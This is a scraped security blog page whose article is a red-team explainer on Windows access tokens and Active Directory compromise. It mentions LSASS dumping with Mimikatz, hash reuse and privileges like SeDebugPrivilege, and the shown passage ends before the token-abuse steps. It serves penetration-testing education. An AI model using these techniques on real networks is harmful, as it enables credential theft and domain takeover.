4.71-.04 7.09-2.46 7.13-7.25v-3.41c-.7.7-2.48 1.22-5.33 1.55-2.48.29-4.3.8-5.46 1.52-1.15.72-1.73 1.89-1.73 3.5zM164.63 50.51c4.09 0 7.06 1.03 8.9 3.1 1.84 2.07 2.76 5.35 2.76 9.86v19.96h-8.8V65.27c0-2.64-.42-4.61-1.27-5.89-.85-1.28-2.3-1.92-4.37-1.92-2.4 0-4.13.72-5.21 2.17s-1.61 3.82-1.61 7.13v16.68h-8.8V51.38h8.37v4.46h.19c2.17-3.55 5.46-5.33 9.84-5.33zM195.75 50.51c4.42 0 7.6 1.72 9.55 5.15h.12v-4.28h8.37v30.07c0 4.63-1.44 8.14-4.31 10.54-2.87 2.4-6.95 3.6-12.25 3.6-4.05 0-7.39-.97-10.01-2.91-2.63-1.94-4.02-4.4-4.19-7.38h8.74c.7 2.93 2.89 4.4 6.57 4.4 2.27 0 4.02-.67 5.24-2.01 1.22-1.34 1.83-3.25 1.83-5.74v-4.4h-.12c-.87 1.57-2.14 2.79-3.81 3.66-1.67.87-3.61 1.3-5.8 1.3-4.3 0-7.66-1.41-10.08-4.22-2.42-2.81-3.63-6.78-3.63-11.9 0-4.55 1.27-8.33 3.81-11.35 2.57-3.02 5.88-4.53 9.97-4.53zm-4.96 15.75c0 3.02.63 5.37 1.89 7.07 1.26 1.7 3.01 2.54 5.24 2.54 2.27 0 4.09-.82 5.46-2.45 1.36-1.63 2.05-3.79 2.05-6.48 0-3.22-.65-5.66-1.95-7.32-1.3-1.65-3.17-2.48-5.61-2.48-2.27 0-4.02.86-5.24 2.57-1.23 1.73-1.84 3.91-1.84 6.55zM235.68 50.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.73 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.31 5.19-1.98 8.08-1.98zm6.76 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31z"/><path d="M59.98 100.11c5.17 0 9.51 1.46 13.02 4.37s5.54 6.77 6.08 11.56h-9.42c-.33-2.19-1.43-4.03-3.29-5.52-1.86-1.49-3.99-2.23-6.39-2.23-3.8 0-6.76 1.36-8.87 4.09-2.11 2.73-3.16 6.43-3.16 11.1 0 4.55 1.06 8.15 3.19 10.82s5.07 4 8.83 4c2.81 0 5.08-.86 6.82-2.57 1.74-1.71 2.81-4.16 3.22-7.35h9.42c-.5 5.62-2.51 10.04-6.04 13.27-3.53 3.22-8.01 4.84-13.42 4.84-6.49 0-11.74-2.14-15.75-6.42-4.01-4.28-6.01-9.81-6.01-16.58 0-6.86 1.98-12.47 5.95-16.83 3.97-4.37 9.24-6.55 15.82-6.55zM90.85 113.38l7.25 21.95h.12l7.01-21.95h9.11l-13.39 36.08c-.95 2.52-2.26 4.36-3.94 5.52-1.67 1.16-4 1.74-6.98 1.74-1.28 0-3.12-.1-5.52-.31v-7.25c1.57.21 3.12.31 4.65.31 1.24 0 2.2-.38 2.88-1.15.68-.76 1.02-1.73 1.02-2.88 0-.66-.12-1.32-.37-1.98l-11.28-30.07h9.44zM126.13 101.17v16.12h.12c.95-1.45 2.3-2.6 4.06-3.47 1.76-.87 3.77-1.3 6.04-1.3 3.93 0 7.12 1.57 9.58 4.71 2.46 3.14 3.69 7.19 3.69 12.15 0 5-1.22 9.07-3.66 12.21-2.44 3.14-5.66 4.71-9.67 4.71-5.21 0-8.7-1.65-10.48-4.96h-.12v4.09h-8.37v-44.27h8.81zm-.31 28.27c0 3.1.68 5.58 2.05 7.44 1.36 1.86 3.18 2.79 5.46 2.79 2.23 0 4.04-.91 5.42-2.73 1.38-1.82 2.08-4.32 2.08-7.5 0-3.14-.67-5.64-2.02-7.5-1.34-1.86-3.19-2.79-5.55-2.79-2.32 0-4.13.95-5.46 2.85-1.32 1.9-1.98 4.38-1.98 7.44zM170.03 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.74 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.48-1.32 5.18-1.98 8.08-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM209.52 112.51c.74 0 1.38.1 1.92.31V121c-.95-.21-2.01-.31-3.16-.31-5.79 0-8.68 3.43-8.68 10.29v14.45h-8.8v-32.05h8.37v5.95h.12c.87-2.07 2.24-3.72 4.12-4.96 1.88-1.24 3.92-1.86 6.11-1.86zM245.66 101.17v44.27h-8.37v-4.09h-.12c-1.9 3.31-5.15 4.96-9.73 4.96-4.42 0-7.93-1.61-10.51-4.84-2.58-3.22-3.88-7.34-3.88-12.34 0-4.88 1.31-8.87 3.94-11.97 2.62-3.1 6.04-4.65 10.26-4.65 1.94 0 3.77.4 5.49 1.21 1.71.81 3.05 1.99 4 3.56h.12v-16.12h8.8zm-23.8 28.21c0 2.93.69 5.38 2.08 7.35 1.38 1.96 3.27 2.95 5.67 2.95 2.52 0 4.41-.92 5.67-2.76 1.26-1.84 1.89-4.37 1.89-7.59s-.66-5.72-1.98-7.5c-1.32-1.78-3.2-2.67-5.64-2.67-2.52 0-4.43.93-5.73 2.79-1.31 1.85-1.96 4.33-1.96 7.43zM267.12 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.74 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.32 5.18-1.98 8.08-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM300.53 101.17c.74 0 2.29.08 4.65.25v6.57c-1.16-.12-2.21-.19-3.16-.19-1.28 0-2.17.28-2.67.84-.5.56-.74 1.52-.74 2.88v1.86h6.08v5.89h-6.08v26.16h-8.8v-26.16h-5.27v-5.89h5.27v-2.36c0-3.14.94-5.57 2.82-7.29 1.88-1.7 4.51-2.56 7.9-2.56zM323.35 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.2 3.44 5.55 6.11 1.34 2.67 2.01 5.74 2.01 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.5-1.32 5.2-1.98 8.09-1.98zm6.76 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM362.53 112.51c4.09 0 7.06 1.03 8.9 3.1 1.84 2.07 2.76 5.35 2.76 9.86v19.96h-8.8v-18.17c0-2.64-.42-4.61-1.27-5.89-.85-1.28-2.3-1.92-4.37-1.92-2.4 0-4.13.72-5.21 2.17s-1.61 3.82-1.61 7.13v16.68h-8.8v-32.05h8.37v4.46h.19c2.18-3.55 5.46-5.33 9.84-5.33zM394.03 112.51c4.3 0 7.66.87 10.08 2.6 2.42 1.74 3.77 4.28 4.06 7.63h-8.37c-.12-1.53-.68-2.63-1.67-3.32-.99-.68-2.44-1.02-4.34-1.02-1.65 0-2.88.25-3.69.74-.81.5-1.21 1.24-1.21 2.23 0 .74.27 1.36.81 1.86s1.35.93 2.45 1.3c1.09.37 2.3.68 3.63.93 4.01.79 6.84 1.59 8.49 2.42 1.65.83 2.86 1.82 3.63 2.98.76 1.16 1.15 2.58 1.15 4.28 0 3.6-1.31 6.36-3.94 8.28-2.62 1.92-6.19 2.88-10.69 2.88-4.71 0-8.38-1.01-11-3.04-2.63-2.02-3.98-4.77-4.06-8.25h8.37c0 1.65.64 2.97 1.92 3.94 1.28.97 2.89 1.46 4.84 1.46 1.65 0 3.03-.36 4.12-1.09 1.09-.72 1.64-1.72 1.64-3.01 0-.83-.34-1.51-1.02-2.05-.68-.54-1.64-1.01-2.88-1.43-1.24-.41-3.16-.89-5.77-1.43-2.07-.41-3.91-.97-5.52-1.67-1.61-.7-2.84-1.62-3.69-2.76-.85-1.14-1.27-2.53-1.27-4.18 0-2.11.51-3.95 1.52-5.52 1.01-1.57 2.56-2.76 4.65-3.56 2.06-.79 4.66-1.2 7.76-1.2zM429 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.01 5.74 2.01 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95H444c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.32 5.19-1.98 8.09-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31z"/></g></svg>
    </span>
  </span>
</a>
-->
    </li>
    <!--
    <li class="mainmenu__item mainmenu__item--active">
      <a href="/blog/2024/" tabindex="6">Blog</a>
    </li>-->
  </ul>

</nav>

  </div>
</header><!-- #masthead -->


    <div class="site-content">
      <!--[if lt IE 9]>
        <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
      <![endif]-->
      <div class="contentblock contentblock--hero contentblock--hero--blog contentblock--img contentblock--center">

  <div class="container">

    <h1 class="contentblock__title bloghero__title">
      Our Blog
    </h1>


  </div>

</div>










  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  



  
  

  




<div class="submenu js-submenu">


  <div class="submenu__mask">
    <div class="submenu__mask__left"></div>
    <div class="submenu__mask__clip"></div>
    <div class="submenu__mask__right"></div>
  </div>


  <div class="overthrow sidescroll">

    <ul class="sidescroll__list clearfix">
      

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2024/" class="submenu__item  lightfont">
                2024 (5)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2023/" class="submenu__item  lightfont">
                2023 (18)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2022/" class="submenu__item submenu__item--active lightfont">
                2022 (10)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2021/" class="submenu__item  lightfont">
                2021 (13)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2020/" class="submenu__item  lightfont">
                2020 (30)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2019/" class="submenu__item  lightfont">
                2019 (10)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2018/" class="submenu__item  lightfont">
                2018 (14)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2017/" class="submenu__item  lightfont">
                2017 (27)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2016/" class="submenu__item  lightfont">
                2016 (22)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2015/" class="submenu__item  lightfont">
                2015 (17)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2014/" class="submenu__item  lightfont">
                2014 (15)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2013/" class="submenu__item  lightfont">
                2013 (30)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2012/" class="submenu__item  lightfont">
                2012 (27)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2011/" class="submenu__item  lightfont">
                2011 (33)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2010/" class="submenu__item  lightfont">
                2010 (36)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2009/" class="submenu__item  lightfont">
                2009 (81)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2008/" class="submenu__item  lightfont">
                2008 (75)
              </a>
            </li>
          

        

          
            <li class="sidescroll__list__item">

              <a href="/blog/2007/" class="submenu__item  lightfont">
                2007 (80)
              </a>
            </li>
          

        

      

    </ul>

  </div>


</div>



<div class="js-contentWrap">

  <article class="article container js-content">

    <header class="article__head">

      

      <div class="article__head__txt">

        <div>
          <h1 class="article__heading article__heading--abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass">Abusing Windows’ tokens to compromise Active Directory without touching LSASS</h1>

          <div class="article__readtime">

            Reading time

            

            
              ~34 min
            

          </div>

          <i class="article__date">
            Posted
            
              by aurelien.chalot@orangecyberdefense.com
            

            on

            27 October 2022
          </i>

          

            

            

              <div class="article__tags">Categories:

              

                
              

                
                  <a href="/blog/authentication/">Authentication</a>,
                
              

                
                  <a href="/blog/internals/">Internals</a>,
                
              

                
                  <a href="/blog/redteam/">Redteam</a>,
                
              

                
                  <a href="/blog/token/">Token</a>,
                
              

                
                  <a href="/blog/windows/">Windows</a>
                
              

              </div>

            

          

          

        </div>

      </div>

    </header>


    <div class="article__content article__content--pre">
      <p>During an internal assessment, I performed an NTLM relay and ended up owning the NT AUTHORITY\SYSTEM account of the Windows server. Looking at the users connected on the same server, I knew that a domain administrator account was connected. All I had to do to compromise the domain, was compromise the account. This could be achieved by dumping the memory of the LSASS process and collecting their credentials or Kerberos TGT’s. Seemed easy until I realised an EDR was installed on the system. Long story short, I ended up compromising the domain admin account without touching the LSASS process. To do so, I relied on an internal Windows mechanism called token manipulation.</p>



<p>The goal of this blog post is to present how I did it. We will see what access tokens are, what they are used for, how we can manipulate them to usurp legitimate accounts without touching LSASS and finally I will present a tool and a CrackMapExec module that can be used during such assessments. All the source code, binaries and CrackMapExec module can be found here&nbsp;<a href="https://github.com/sensepost/impersonate">https://github.com/sensepost/impersonate</a>.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Token manipulation is not a new technique. The first toolkit ever created to manipulate tokens was <a href="https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/incognito/incognito.c">incognito</a>,  released in 2012, which is now part of the meterpreter framework. Having such a tool helped me understand in depth how token manipulation works and allowed me to write this blog post. For that reason I wanted to thank the FSecureLab team for their incredible work and give to Caesar what is Caesar’s.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">I/ A few words on Internal Assessments and LSASS</h2>



<p>There are multiple ways you can compromise an Active Directory environment. For example you can:</p>



<ul><li>Find accounts with weak credentials (the classic, username is the same as the password)</li><li>Exploit Active Directory misconfigurations (Kerberoast, ASREProast, ACL’s, ADCS, etc)</li><li>Exploit a vulnerability within a service on a server and move over to the Active Directory environment.</li></ul>



<p>A common scenario, is the following:</p>



<ul><li>Compromise a server by exploiting vulnerabilities such as EternalBlue or insecure Tomcat management page</li><li>Dump the SAM database and the memory contents of the LSASS process</li><li>Spray the collected credentials against the computers within the network until you find credentials for a domain administrator account</li></ul>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/internal_basic_scenario.png"><img loading="lazy" decoding="async" width="922" height="445" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/internal_basic_scenario.png" alt="" class="wp-image-61987"></a></figure>



<p>Most of the time, sysadmins use privileged accounts (domain administrator accounts) to manage servers. Doing so, they leave authentication secrets inside the memory of the LSASS process such as:</p>



<ul><li>Cleartext credentials</li><li>NT hashes (hashed passwords)</li><li>Kerberos tickets</li></ul>



<p>With tools such as Mimikatz, we can dump the contents of the memory of the LSASS process and parse it, allowing us to gather authentication secrets. Below you will see that we are able to retrieve the NT hash of the Administrateur account of the WHITEFLAG domain:</p>



<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-7 is-layout-flex wp-block-gallery-is-layout-flex">
<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/mimikatz_exploit.png"><img loading="lazy" decoding="async" width="626" height="433" data-id="61988" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/mimikatz_exploit.png" alt="" class="wp-image-61988"></a></figure>
</figure>



<p>We can then reuse this hash to connect to the domain controller which means that we have compromised the domain:</p>



<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-8 is-layout-flex wp-block-gallery-is-layout-flex">
<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/ad_compromised.png"><img loading="lazy" decoding="async" width="1024" height="65" data-id="61989" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/ad_compromised-1024x65.png" alt="" class="wp-image-61989"></a></figure>
</figure>



<p>However, being able to use Mimikatz as is, means that there is probably no antivirus nor EDR’s on the computer. LSASS, being one of the more important processes within the Windows operating system, is heavily monitored by security products and it is not possible to access its contents that easily. Most of the time, the Mimikatz.exe binary will be flagged and instantly deleted the moment it is written to disk. You could try to bypass such security controls but I’m a lazy hacker. The easier the solution, the better. And indeed there is an easier solution that doesn’t involve bypassing security products:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/onestepforward.png"><img loading="lazy" decoding="async" width="587" height="583" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/onestepforward.png" alt="" class="wp-image-61990"></a></figure>



<p>Abusing Windows objects!</p>



<h2 class="wp-block-heading"><strong>II/ Kernel, Windows Objects and Access Tokens</strong></h2>



<p>Windows, like any operating system, has a kernel whose function is to:</p>



<ul><li>Manage system resources (RAM, processes, files, threads, etc)</li><li>Manage secure access to these resources</li><li>Allow communication between hardware and software</li></ul>



<p>To do so, the kernel relies on multiple objects which we can list using the WinObj.exe tool from the <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" data-type="URL" data-id="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">SysInternal</a> toolkit:</p>



<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-9 is-layout-flex wp-block-gallery-is-layout-flex">
<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/winobj.png"><img loading="lazy" decoding="async" width="433" height="392" data-id="61991" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/winobj.png" alt="" class="wp-image-61991"></a></figure>
</figure>



<p>Among these objects there are “Process” objects used to manage processes, “Thread” objects used to manage running threads or even “Session” objects used to manage user’s sessions on the system. The one we are interested in, is the “Access Token” object. </p>



<p>On Windows, an access token is an object that describes the security context of a process or a thread. Below you will see what the access token of the powershell.exe process launched by the local administrator account “Administrateur” looks like:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/process_token.png"><img loading="lazy" decoding="async" width="407" height="614" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/process_token.png" alt="" class="wp-image-61992"></a></figure>



<p>As you can see there is a lot of information, such as:</p>



<ul><li>The name of the owner of the token</li><li>The groups in which the owner of the token belongs to</li><li>A logon SID which uniquely identifies the user on the system</li><li>A list of privileges associated to the user</li></ul>



<p>Regarding the privileges, there are <a href="https://learn.microsoft.com/en-gb/windows/win32/secauthz/privilege-constants" data-type="URL" data-id="https://learn.microsoft.com/en-gb/windows/win32/secauthz/privilege-constants">37 different privileges</a> within the Windows operating system, allowing a user who owns them to perform specific actions on the system. For example:</p>



<ul><li>SeLoadDriverPrivilege allows a user to load or unload a driver</li><li>SeShutdownPrivilege allows a user to shutdown the machine</li><li>SeDebugPrivilege allows a user to debug any process on the system and access the process’ memory contents</li></ul>



<p>Depending on the user account you use and the method used to  launch a process, you may have more or less privileges. For example here are the privileges owned by a standard Windows local account:</p>



<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-10 is-layout-flex wp-block-gallery-is-layout-flex">
<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/low_privilege.png"><img loading="lazy" decoding="async" width="621" height="203" data-id="61993" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/low_privilege.png" alt="" class="wp-image-61993"></a></figure>
</figure>



<p>Here is the output when the process is launched with local administrator rights:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/high_privilege.png"><img loading="lazy" decoding="async" width="957" height="521" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/high_privilege.png" alt="" class="wp-image-61994"></a></figure>



<p>And finally the output when the process is launched with the NT AUTHORITY\SYSTEM account:</p>



<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-11 is-layout-flex wp-block-gallery-is-layout-flex">
<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/system_privilege.png"><img loading="lazy" decoding="async" width="942" height="565" data-id="61995" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/system_privilege.png" alt="" class="wp-image-61995"></a></figure>
</figure>



<p>What’s interesting is that having a privilege doesn’t mean that you can use it. Indeed each privilege has a state which indicates whether the privilege is enabled or not. If the privilege is enabled then you can perform actions that require such privilege. Otherwise you will not be able to. Hopefully, if you own a privilege which state is disabled, you can still enable it yourself running using the appropriate WinAPI function (<a href="https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges" data-type="URL" data-id="https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges">AdjustTokenPrivilege</a>).</p>



<p>The last question we may have at this point is: when and how are these tokens created. To answer it we will have to dig a little bit into the different types of authentication on a Windows system.</p>



<h2 class="wp-block-heading"><strong>III/ Windows Authentication and Token Creation</strong></h2>



<p>There are two ways to connect to a Windows computer, namely:</p>



<ul><li>Interactive logon</li><li>Non interactive logon (also called remote logon)</li></ul>



<p>Depending on the method used to connect to a Windows computer, two types of access token will be created.</p>



<h3 class="wp-block-heading"><strong>Interactive logon</strong></h3>



<p>We will refer to all login methods that rely on the Winlogon UI as interactive logon:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/logonui_process.png"><img loading="lazy" decoding="async" width="818" height="439" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/logonui_process.png" alt="" class="wp-image-61996"></a></figure>



<p>This is the case when you connect locally to a computer or when you connect through RDP. The interactive logon process is the following:</p>



<ul><li>The user enters their credentials on the WinLogon UI</li><li>Credentials are forwarded to the LSASS process</li><li>The LSASS process checks if the credentials are correct</li><li>If the credentials are correct, LSASS will create what is called a primary token that represents the user that logged in and each of the processes launched by this user will inherit the primary token</li></ul>



<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-12 is-layout-flex wp-block-gallery-is-layout-flex">
<figure class="wp-block-image size-large"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/token_creation.png"><img loading="lazy" decoding="async" width="1024" height="508" data-id="61997" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/token_creation-1024x508.png" alt="" class="wp-image-61997"></a></figure>
</figure>



<p>This is the reason why the powershell.exe we have seen before had a token whose user attribute is named after the Administrateur account, because the process was launched by the Administrateur account and inherited its token:</p>



<figure class="wp-block-image size-full"><a href="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/powershell_token.png"><img loading="lazy" decoding="async" width="418" height="169" src="/img/pages/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/powershell_token.png" alt="" class="wp-image-61998"></a></figure>



